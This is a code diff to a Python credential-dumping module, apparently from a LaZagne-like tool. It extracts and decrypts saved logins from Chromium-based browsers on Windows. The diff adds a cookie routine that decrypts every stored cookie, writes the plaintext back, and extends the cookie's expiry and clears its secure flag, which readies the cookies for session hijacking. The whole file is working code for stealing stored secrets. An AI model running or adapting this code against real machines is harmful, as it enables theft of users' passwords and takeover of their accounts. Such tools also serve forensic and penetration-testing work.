@@ -4,13 +4,12 @@ import json
 import os
 import shutil
 import sqlite3
-import win32crypt
 import tempfile
 import traceback
 
 from Crypto.Cipher import AES
 
-from winsecs.utils import log
+from winsecs.utils import log, CryptUnprotectData
 
 
 class Chromium:
@@ -42,28 +41,28 @@ class Chromium:
                 try:
                     data = json.load(f)
                     # Add profiles from json to Default profile. set removes duplicates
-                    profiles |= set(data['profile']['info_cache'])
+                    profiles |= set(data['profile']['info_cache'].keys())
                 except Exception:
                     pass
 
             with open(profiles_path) as f:
                 try:
                     master_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]  # removing DPAPI
-                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+                    master_key = CryptUnprotectData(master_key, profile)
                 except Exception:
                     master_key = None
 
             # Each profile has its own password database
-            for profile in profiles:
+            for prof in profiles:
                 # Some browsers use names other than "Login Data"
                 # Like YandexBrowser - "Ya Login Data", UC Browser - "UC Login Data.18"
                 try:
-                    db_files = os.listdir(os.path.join(path, profile))
+                    db_files = os.listdir(os.path.join(path, prof))
                 except Exception:
                     continue
                 for db in db_files:
                     if db.lower() in ['login data', 'ya passman data']:
-                        databases.add((os.path.join(path, profile, db), master_key))
+                        databases.add((os.path.join(path, prof, db), master_key))
         return list(databases)
 
     def maketmp(self):
@@ -79,14 +78,56 @@ class Chromium:
             except Exception:
                 log.debug(traceback.format_exc())
 
-    def creds_dump(self, db_path, is_yandex=False, master_key=None):
-        """
-        Export credentials from the given database
+    def dump(self, profile, password, master_key, is_yandex):
+        pwd = None
+        # Yandex passwords use a masterkey stored on windows credential manager
+        # https://yandex.com/support/browser-passwords-crypto/without-master.html
+        if is_yandex:
+            try:
+                try:
+                    p = json.loads(str(password))
+                except Exception:
+                    p = json.loads(password)
 
-        :param unicode db_path: database path
-        :return: list of credentials
-        :rtype: tuple
-        """
+                pwd = base64.b64decode(p['p'])
+            except Exception:
+                # New version does not use json format
+                pass
+
+            # Passwords are stored using AES-256-GCM algorithm
+            # The key used to encrypt is stored on the credential manager
+
+            # yandex_enckey:
+            #   - 4 bytes should be removed to be 256 bits
+            #   - these 4 bytes correspond to the nonce ?
+
+            # cipher = AES.new(yandex_enckey, AES.MODE_GCM)
+            # plaintext = cipher.decrypt(password)
+            # Failed...
+        elif isinstance(password, bytes) and password.endswith(b'v10'):
+            if master_key:
+                # chromium version > 80
+                try:
+                    iv = password[3:15]
+                    payload = password[15:]
+                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                    pwd = cipher.decrypt(payload)[:-16].decode()  # remove suffix bytes
+                except:
+                    pass
+        else:
+            try:
+                password_bytes = CryptUnprotectData(password, profile)
+            except:
+                try:
+                    password_bytes = CryptUnprotectData(password, profile)
+                except:
+                    password_bytes = None
+
+            if password_bytes is not None:
+                pwd = password_bytes.decode()
+        return pwd
+
+    def creds_dump(self, profile, db_path, is_yandex=False, master_key=None):
         credentials = set()
         # yandex_enckey = None
 
@@ -108,59 +149,14 @@ class Chromium:
         try:
             conn = sqlite3.connect(db_path)
             cursor = conn.cursor()
-            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
         except Exception:
             log.debug(traceback.format_exc())
-            return list(credentials)
+            return []
 
         for url, login, password in cursor.fetchall():
             try:
-                pwd = None
-                # Yandex passwords use a masterkey stored on windows credential manager
-                # https://yandex.com/support/browser-passwords-crypto/without-master.html
-                if is_yandex:
-                    try:
-                        try:
-                            p = json.loads(str(password))
-                        except Exception:
-                            p = json.loads(password)
-
-                        pwd = base64.b64decode(p['p'])
-                    except Exception:
-                        # New version does not use json format
-                        pass
-
-                    # Passwords are stored using AES-256-GCM algorithm
-                    # The key used to encrypt is stored on the credential manager
-
-                    # yandex_enckey:
-                    #   - 4 bytes should be removed to be 256 bits
-                    #   - these 4 bytes correspond to the nonce ?
-
-                    # cipher = AES.new(yandex_enckey, AES.MODE_GCM)
-                    # plaintext = cipher.decrypt(password)
-                    # Failed...
-                else:
-                    # Decrypt the Password
-                    try:
-                        password_bytes = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
-                    except:
-                        try:
-                            password_bytes = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
-                        except:
-                            password_bytes = None
-
-                    if password_bytes is not None:
-                        pwd = password_bytes.decode()
-                    elif master_key:
-                        # chromium version > 80
-                        try:
-                            iv = password[3:15]
-                            payload = password[15:]
-                            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-                            pwd = cipher.decrypt(payload)[:-16].decode()  # remove suffix bytes
-                        except:
-                            pass
+                pwd = self.dump(profile, password, master_key, is_yandex)
 
                 if not url and not login and not pwd:
                     continue
@@ -172,8 +168,34 @@ class Chromium:
         conn.close()
         return list(credentials)
 
+    def cookie_dump(self, profile, db_path, master_key=None):
+        length = 0
+        try:
+            conn = sqlite3.connect(db_path)
+            cursor = conn.cursor()
+            cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
+        except Exception:
+            log.debug(traceback.format_exc())
+            return 0
+
+        for host_key, name, encrypted_value in cursor.fetchall():
+            try:
+                decrypted_value = self.dump(profile, encrypted_value, master_key, False)
+                cursor.execute(
+                    "UPDATE cookies SET value = ?, expires_utc = 99999999999999999, is_secure = 0 WHERE host_key = ? AND name = ?",
+                    (decrypted_value, host_key, name)
+                )
+                length += 1
+            except Exception:
+                log.debug(traceback.format_exc())
+
+        conn.commit()
+        conn.close()
+        return length
+
     def run(self, profile):
         credentials = {}
+        cookies = {}
         databases = self.db_dirs(profile)
 
         for database_path, master_key in databases:
@@ -185,14 +207,37 @@ class Chromium:
             shutil.copy(database_path, temp)
             log.debug(f'Temporary db copied: {temp}')
             try:
-                found = self.creds_dump(temp, ('yandex' in database_path.lower()), master_key)
+                found = self.creds_dump(profile, temp, ('yandex' in database_path.lower()), master_key)
                 if found:
                     credentials[database_path] = found
                 os.remove(temp)
             except Exception:
                 log.debug(traceback.format_exc())
 
-        return credentials
+            database_path = os.path.split(database_path)
+            database_path = os.path.join(database_path[0], 'Cookies')
+
+            if not os.path.exists(database_path):
+                continue
+
+            temp = self.maketmp()
+            shutil.copy(database_path, temp)
+            log.debug(f'Cookie db copied: {temp}')
+            try:
+                found = self.cookie_dump(profile, temp, master_key)
+                if found:
+                    cookies[database_path] = found
+                else:
+                    os.remove(temp)
+            except Exception:
+                log.debug(traceback.format_exc())
+
+        ret = {}
+        if cookies:
+            ret['Cookies'] = list(cookies)
+        if credentials:
+            ret['Credentials'] = credentials
+        return ret
 
 
 class UCBrowser(Chromium):
